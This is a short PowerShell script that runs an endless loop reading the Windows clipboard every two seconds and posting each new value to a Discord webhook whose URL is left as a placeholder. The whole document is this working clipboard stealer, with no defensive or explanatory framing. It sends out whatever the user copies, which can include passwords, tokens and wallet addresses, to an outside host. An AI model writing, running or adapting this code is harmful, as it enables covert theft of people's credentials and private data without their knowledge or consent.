# Webhook
$webhookUrl = "YOUR DISCORD WEBHOOK"

$prevClipboardContent = ""

function Get-LolYeet {
    param($Content)

    $payload = @{
        content = $Content
    }

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
}

while ($true) {

    $currentClipboardContent = Get-Clipboard


    if ($currentClipboardContent -ne $prevClipboardContent) {

        Get-LolYeet -Content $currentClipboardContent

        $prevClipboardContent = $currentClipboardContent
    }

    Start-Sleep -Seconds 2
}
